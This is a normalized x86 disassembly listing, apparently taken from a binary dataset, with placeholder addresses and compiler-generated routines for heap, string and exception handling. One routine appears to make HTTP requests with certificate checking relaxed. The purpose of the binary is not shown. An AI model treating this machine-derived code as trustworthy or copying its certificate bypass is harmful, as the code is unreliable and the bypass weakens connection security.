mov ecx [ ebp - 0x18 ]
lea eax [ edx * 8 ]
sub eax edx
lea eax [ ecx + eax * 4 ]
cmp esi eax
je r-xdata
cmp ebx 0xffffffff
je r-xdata
inc [ ebp - 0x14 ]
add esi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov ebx [ esi + 0xc ]
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
mov ebx [ eax ]
mov [ esi ] ebx
mov ebx [ eax + 0x4 ]
mov [ esi + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
mov [ esi + 0x8 ] ebx
mov ebx [ eax + 0xc ]
mov [ esi + 0xc ] ebx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edx
mov edx [ eax + 0x10 ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0x10 ] edx
mov [ eax + 0x10 ] ecx
mov edx [ eax + 0x14 ]
mov ecx [ esi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ eax + 0x14 ] ecx
call sub_10028da1
shl ebx 0xf
and eax 0x7fff
shl edi 0xf
or ebx 0x7fff
or edi eax
cmp ebx [ ebp - 0x14 ]
jb r-xdata
sub_10050ee7
push 0x4
mov eax sub_1007e209
call sub_10050d0f
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_1001a1b3
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_100067d1
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_1002470e
push 0x20
call sub_1005ac7e
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_10021d17
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_1005daf0
mov ecx esi
mov [ rw-data ] esi
call sub_1001c4b0
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_10026104
mov esi eax
sub_10050f80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d5e0
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
push edx
push ebx
push eax
mov ecx esi
call sub_10007e00
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_10051030
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
sub eax edi
mov ecx eax
and ecx 0xfffffffc
cmp ecx 0x4
jle r-xdata
pop edi
mov esp ebp
pop ebp
retn
push esi
mov edx [ edi + eax - 0x4 ]
mov ecx [ edi ]
lea esi [ eax - 0x4 ]
mov [ edi + eax - 0x4 ] ecx
mov [ ebp - 0x4 ] edx
push ebx
lea edx [ ebp - 0x4 ]
mov eax esi
sar eax 0x2
push edx
push eax
xor eax eax
call sub_10047ab0
mov eax esi
mov ecx esi
and ecx 0xfffffffc
add esp 0xc
cmp ecx 0x4
jg r-xdata
pop esi
sub_10051080
push ebp
mov ebp esp
push 0xffffffff
push sub_100811d6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x208
xor ebx ebx
lea ecx [ ebp - 0x26c ]
push ebx
push ecx
mov [ ebp - 0x284 ] eax
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x26c ]
call sub_10044b20
cmp eax ebx
je r-xdata
push 0x144
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x270 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x5c ]
lea eax [ ebx + 0x72 ]
call sub_1001bb80
lea eax [ ebx + 0x1 ]
jmp r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0x270 ]
call sub_1001e330
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x274 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x278 ] ebx
mov [ ebp - 0x274 ] ebx
call sub_10028710
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x278 ]
cmp esi ebx
jne r-xdata
lea ecx [ ebp - 0x26c ]
push ecx
lea esi [ ebp - 0x278 ]
mov [ ebp - 0x270 ] ebx
call sub_10031da0
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x74
call sub_1001bb80
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ebx [ ebp - 0x278 ]
call sub_10007e40
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xd2
call sub_1001bb80
mov [ ebp - 0x270 ] 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ ebp - 0x284 ]
push edx
lea edi [ ebp - 0x278 ]
call sub_1000c490
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xcf
call sub_1001bb80
mov [ ebp - 0x270 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x27c ]
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x157
call sub_1001bb80
mov [ ebp - 0x270 ] 0xa
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ebx [ ebp - 0x278 ]
lea eax [ ebp - 0x27c ]
xor esi esi
push eax
lea ecx [ ebp - 0x280 ]
mov [ ebp - 0x27c ] esi
mov [ ebp - 0x280 ] esi
call sub_10021b00
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x15
call sub_1001bb80
mov [ ebp - 0x270 ] 0x6
jmp r-xdata
mov esi [ ebp - 0x278 ]
call sub_1000d0b0
test eax eax
je r-xdata
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax [ ebp - 0x270 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edi [ ebp - 0x280 ]
lea ecx [ ebp - 0x27c ]
call sub_1002d790
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
lea eax [ esi + 0x1a ]
call sub_1001bb80
mov [ ebp - 0x270 ] 0x7
jmp r-xdata
mov ecx [ ebp - 0x280 ]
mov edx [ ebp - 0x27c ]
push ecx
push edx
lea eax [ ebp - 0x26c ]
call sub_1000c170
add esp 0x8
cmp eax esi
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x12f
call sub_1001bb80
mov [ ebp - 0x270 ] 0x8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xaa
call sub_1001bb80
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x9
jmp r-xdata
sub_10051390
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
sub_10051410
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ r--data ]
mov [ ebp - 0x220 ] eax
movsx eax [ edx ]
push ebx
push esi
xor eax 0xffdf
push edi
mov edi [ rw-data ]
mov [ ebp - 0x21c ] ecx
xor ecx ecx
and eax 0xff
mov [ ebp - 0x218 ] ax
mov [ ebp - 0x216 ] cx
cmp [ edi + 0x120 ] ecx
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x208
push ecx
lea edx [ ebp - 0x210 ]
push edx
call sub_10078970
lea eax [ ebp - 0x214 ]
add esp 0xc
push eax
call sub_1000b569
mov ecx [ ebp - 0x214 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x214 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x210 ]
xor esi esi
lea esp [ esp ]
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x210 ]
push ebx
mov edx 0x7fffffff
call sub_1006b860
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x214 ]
push ecx
call sub_1000b569
mov ecx [ ebp - 0x214 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x214 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0x218 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_10030af0
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
lea ecx [ ebp - 0x210 ]
push ecx
mov ecx [ ebp - 0x220 ]
push edx
mov edx [ ebp - 0x21c ]
call sub_10065050
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x4
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10051600
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1005d8e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10051630
push ebp
mov ebp esp
push 0xffffffff
push sub_100813c8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call j_sub_10030adf
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_1005e2c0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_100516a0
push ebp
mov ebp esp
push ebx
mov ebx [ GetProcessHeap@IAT ]
push esi
mov esi ecx
push edi
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x3c ] edi
inc [ edi ]
call sub_10008200
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
mov [ eax ] edi
mov edi eax
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
sub_10051781
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] ebx
setne cl
mov [ ebp - 0x14 ] ecx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
call sub_100238e9
mov ecx [ ebp + 0x1c ]
sub ecx [ ebp - 0x10 ]
cmp eax ecx
jg r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_10026143
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
push [ ebp - 0x10 ]
call sub_10026143
add esp 0x10
test eax eax
js r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_10078600
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov ebx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x14 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_10051880
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10051900
push ebp
mov ebp esp
push 0xffffffff
push sub_100801a9
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x1
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ esi + 0x10 ]
sub eax edx
add eax [ ebx + 0x10 ]
cmp edi eax
ja r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x1 ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov ecx esi
call sub_1005be50
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_10040f60
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10016ae0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_100519c6
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100026dd
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10051a63
push 0x58
mov eax sub_1007ec48
call sub_10007703
movzx eax [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_10009450
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10018820
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_1002a730
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx ebx [ ebp + 0x1c ]
mov edx [ ecx ]
push ebx
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ edx + 0x1c ]
mov eax edi
jmp r-xdata
call sub_10020962
mov [ ebp - 0x4 ] 0x3
call sub_10039e87
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_10019c00
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003a25a
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1004dbe5
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x54 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_10017235
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_1004c5ab
mov ecx [ eax ]
push edi
push [ ebp - 0x54 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_10017235
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004dbe5
mov eax [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10051bc0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081526
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xec ] eax
xor eax eax
mov [ ecx ] eax
mov [ ebp - 0xd4 ] ecx
push 0xffffffff
xor ecx ecx
mov [ ebp - 0xdc ] edx
mov [ edx ] eax
push eax
lea edx [ ebx + 0x24 ]
mov [ ebp - 0xac ] cx
push edx
lea ecx [ ebp - 0xac ]
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xe4 ] eax
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0x98 ] 0x7
mov [ ebp - 0x9c ] eax
call sub_1001c310
mov [ ebp - 0x4 ] 0x0
cmp [ ebx + 0xb8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x98 ] 0x8
jb r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov ecx edi
lea esi [ ebp - 0xc8 ]
call sub_10057df0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x1
call sub_1000c1e0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xb4 ] 0x8
jb r-xdata
mov eax 0x64
jmp r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_10065045
add esp 0x4
lea edx [ ebp - 0x30 ]
mov eax 0x5a
call sub_100328b0
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x25
call sub_100328b0
lea edx [ ebp - 0x90 ]
mov eax 0x2a
call sub_100328b0
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x90 ]
mov [ ebp - 0xd0 ] edx
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xd8 ] edi
mov ecx [ ebp - 0xc8 ]
push ecx
call sub_10065045
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x18
xor esi esi
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
xor edx edx
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov esi 0x1000
jmp r-xdata
neg eax
sbb eax eax
and eax 0x800000
or eax edx
push 0x0
or eax esi
or eax 0x84600900
push eax
mov eax [ ebp - 0xd0 ]
push 0x0
push 0x0
lea edx [ ebp - 0x30 ]
push edx
mov edx [ ebx + 0xd4 ]
push ecx
mov ecx [ ebx + 0xc4 ]
push eax
push ecx
call edx
mov esi eax
mov [ ebp - 0xd0 ] esi
test esi esi
jne r-xdata
lea ecx [ ebp - 0xac ]
mov edx 0x2000
jmp r-xdata
test eax eax
je r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
mov [ ebp - 0xcc ] 0x1
jmp r-xdata
cmp [ ebp - 0x98 ] 0x8
mov ecx [ ebp - 0xac ]
jae r-xdata
mov edx [ ebp - 0xd8 ]
mov eax [ ebp - 0xe4 ]
mov ecx [ ebp - 0xe0 ]
push edx
mov edx [ ebx + 0xe4 ]
push eax
push 0x0
push ecx
push esi
call edx
test eax eax
jne r-xdata
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov esi [ ebp - 0xd4 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov edi [ ebp - 0xec ]
mov ecx [ ebx + 0xdc ]
push 0x0
lea eax [ ebp - 0xf0 ]
push eax
push edi
push 0x20000013
push esi
mov [ ebp - 0xf0 ] 0x4
call ecx
test eax eax
jne r-xdata
mov [ ebp - 0xcc ] 0x2
jmp r-xdata
mov ecx [ ebx + 0xcc ]
push 0x4
lea eax [ ebp - 0xe8 ]
push eax
push 0x1f
push esi
mov [ ebp - 0xe8 ] 0x100
call ecx
cmp [ ebp - 0x98 ] 0x8
jb r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0xdc ]
mov [ esi ] 0x0
mov [ eax ] 0x0
cmp [ edi ] 0x12e
je r-xdata
mov [ ebp - 0xcc ] 0x3
jmp r-xdata
mov edx [ ebx + 0xd8 ]
push esi
call edx
cmp [ ebp - 0xcc ] 0x0
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ ebp - 0xac ]
push ecx
call sub_10065045
add esp 0x4
mov edi [ ebp - 0xd4 ]
push esi
mov esi [ ebp - 0xdc ]
call sub_1002dd80
mov esi [ ebp - 0xd0 ]
mov [ ebp - 0xcc ] eax
sub_10051efc
push 0x8
push r--data
call sub_10078b50
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_10078b95
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
